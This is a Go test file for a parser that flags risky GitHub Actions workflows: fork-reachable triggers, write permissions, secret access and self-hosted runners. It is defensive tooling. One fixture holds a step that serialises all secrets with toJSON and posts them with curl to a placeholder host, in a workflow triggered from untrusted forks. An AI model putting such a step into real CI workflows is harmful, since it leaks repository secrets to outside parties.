package github

import (
	"reflect"
	"sort"
	"testing"
)

func TestParseWorkflow(t *testing.T) {
	tests := []struct {
		name         string
		yaml         string
		wantFork     []string
		wantWrite    []string
		wantSecrets  bool
		wantUnparsed bool
	}{
		{
			// octoscope's own release.yml shape. Elevated and
			// secret-reading, and entirely correct: only someone who can
			// already push a tag can trigger it. Must not be a fork
			// trigger, or the axis would flag half of GitHub.
			name: "tag-triggered release workflow is powerful but trusted",
			yaml: `
on:
  push:
    tags:
      - "v*"
permissions:
  contents: write
jobs:
  release:
    steps:
      - env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
`,
			wantWrite:   []string{"contents: write"},
			wantSecrets: true,
		},
		{
			// The escalation shape: untrusted input, base-repo secrets.
			name: "pull_request_target with secrets",
			yaml: `
on:
  pull_request_target:
    types: [opened]
permissions:
  contents: write
jobs:
  build:
    steps:
      - run: echo ${{ secrets.NPM_TOKEN }}
`,
			wantFork:    []string{"pull_request_target"},
			wantWrite:   []string{"contents: write"},
			wantSecrets: true,
		},
		{
			// A bare `on:` decodes to the string key "on" with this
			// target — measured, not assumed: only a typed map[bool]any
			// turns it into true. The parser also looks up "true" as
			// cheap insurance, which this case does not depend on.
			name: "list-form trigger under a bare on key",
			yaml: `
on: [push, workflow_run]
permissions: write-all
`,
			wantFork:  []string{"workflow_run"},
			wantWrite: []string{"write-all"},
		},
		{
			// Flow style is valid YAML and a trivial way to defeat a
			// line-based scanner — the reason this uses a real parser.
			name: "flow-style mapping is still understood",
			yaml: `
on: {issue_comment: {types: [created]}}
permissions: {contents: write, id-token: write}
`,
			wantFork:  []string{"issue_comment"},
			wantWrite: []string{"contents: write", "id-token: write"},
		},
		{
			// Per-job permissions override the top level, so a workflow
			// that looks read-only at the top can still be elevated.
			name: "per-job permissions are picked up",
			yaml: `
on: push
permissions:
  contents: read
jobs:
  publish:
    permissions:
      id-token: write
`,
			wantWrite: []string{"id-token: write"},
		},
		{
			name: "read-only permissions are not grants",
			yaml: `
on: push
permissions:
  contents: read
  issues: read
`,
		},
		{
			// Not understood must be distinguishable from understood and
			// clean, or the report would imply a check that never ran.
			name:         "unparseable content is flagged, not silently clean",
			yaml:         "\x00\x01 this: [is not: valid: yaml",
			wantUnparsed: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseWorkflow([]byte(tt.yaml))
			if got.Unparsed != tt.wantUnparsed {
				t.Fatalf("Unparsed = %v, want %v", got.Unparsed, tt.wantUnparsed)
			}
			if got.UsesSecrets != tt.wantSecrets {
				t.Errorf("UsesSecrets = %v, want %v", got.UsesSecrets, tt.wantSecrets)
			}
			sort.Strings(got.ForkTriggers)
			sort.Strings(got.WritePerms)
			want := append([]string(nil), tt.wantFork...)
			sort.Strings(want)
			if len(got.ForkTriggers) != 0 || len(want) != 0 {
				if !reflect.DeepEqual(got.ForkTriggers, want) {
					t.Errorf("ForkTriggers = %v, want %v", got.ForkTriggers, want)
				}
			}
			wantW := append([]string(nil), tt.wantWrite...)
			sort.Strings(wantW)
			if len(got.WritePerms) != 0 || len(wantW) != 0 {
				if !reflect.DeepEqual(got.WritePerms, wantW) {
					t.Errorf("WritePerms = %v, want %v", got.WritePerms, wantW)
				}
			}
		})
	}
}

// The parser is handed bytes from a repository that may be hostile, so
// it must return rather than panic on anything.
func TestParseWorkflowNeverPanics(t *testing.T) {
	for _, in := range []string{
		"", "\n", "---\n", "[]", "null", "on:", "on: null",
		"on:\n  pull_request_target:\njobs: not-a-map",
		"permissions: 42", "jobs:\n  a: 1\n  b: [x]",
	} {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("parseWorkflow(%q) panicked: %v", in, r)
				}
			}()
			_ = parseWorkflow([]byte(in))
		}()
	}
}

// Regressions from the Codex review of #103, extended by #110: ways a
// secret can be reachable that a substring check misses.
//
// The three `inherit` spellings are the point of the structural read. Each
// one decodes to the same `jobs.a.secrets: inherit` mapping GitHub Actions
// consumes — quoting a key and padding after a colon are insignificant to
// YAML — while none but the first contains the literal text
// "secrets: inherit". Measured before the fix: only the plain form scored.
func TestParseWorkflowSecretSpellings(t *testing.T) {
	tests := map[string]string{
		"dot form":              "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets.TOKEN }}\n",
		"index form":            "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets['DEPLOY_TOKEN'] }}\n",
		"inherit form":          "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit\n",
		"inherit, quoted key":   "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    \"secrets\": inherit\n",
		"inherit, single quote": "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    'secrets': inherit\n",
		"inherit, padded":       "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    secrets:    inherit\n",
		// toJSON serialises every secret at once while naming none, so it
		// contains neither "secrets." nor "secrets[".
		"toJSON of the context": "on: pull_request_target\njobs:\n  a:\n    env:\n      ALL: ${{ toJSON(secrets) }}\n    steps:\n      - run: curl -d \"$ALL\" https://x.invalid\n",
		"bare context in expr":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo '${{ secrets }}'\n",
	}
	for name, y := range tests {
		t.Run(name, func(t *testing.T) {
			got := parseWorkflow([]byte(y))
			if !got.UsesSecrets {
				t.Errorf("secrets not detected in the %s", name)
			}
			if len(got.ForkTriggers) != 1 {
				t.Errorf("fork trigger not detected: %+v", got.ForkTriggers)
			}
		})
	}
}

// The other direction: the word appearing where it reaches nothing must
// not score. Detection only looks inside `${{ … }}`, so prose and
// similarly-named identifiers stay out — a false positive on this axis is
// what teaches people to ignore it.
func TestParseWorkflowSecretsWordWithoutAccess(t *testing.T) {
	tests := map[string]string{
		"in a comment":         "on: pull_request_target\n# no secrets are used here\njobs:\n  a:\n    steps:\n      - run: true\n",
		"in a step name":       "on: pull_request_target\njobs:\n  a:\n    steps:\n      - name: check for secrets\n        run: true\n",
		"a different context":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.event.number }}\n",
		"similarly named var":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ env.mysecrets }}\n",
		"across two expr ends": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.actor }} secrets ${{ github.sha }}\n",
	}
	for name, y := range tests {
		t.Run(name, func(t *testing.T) {
			if parseWorkflow([]byte(y)).UsesSecrets {
				t.Errorf("%s scored as reaching secrets", name)
			}
		})
	}
}

// A runner only matters if a job actually targets it.
func TestParseWorkflowSelfHostedJobs(t *testing.T) {
	tests := map[string]bool{
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n":                false,
		"jobs:\n  a:\n    runs-on: self-hosted\n":                  true,
		"jobs:\n  a:\n    runs-on: [self-hosted, linux]\n":         true,
		"jobs:\n  a:\n    runs-on:\n      group: my-org-runners\n": true,
		"jobs:\n  a:\n    runs-on:\n      labels: [self-hosted]\n": true,
	}
	for y, want := range tests {
		if got := parseWorkflow([]byte("on: push\n" + y)).SelfHostedJobs; got != want {
			t.Errorf("SelfHostedJobs = %v, want %v for:\n%s", got, want, y)
		}
	}
}
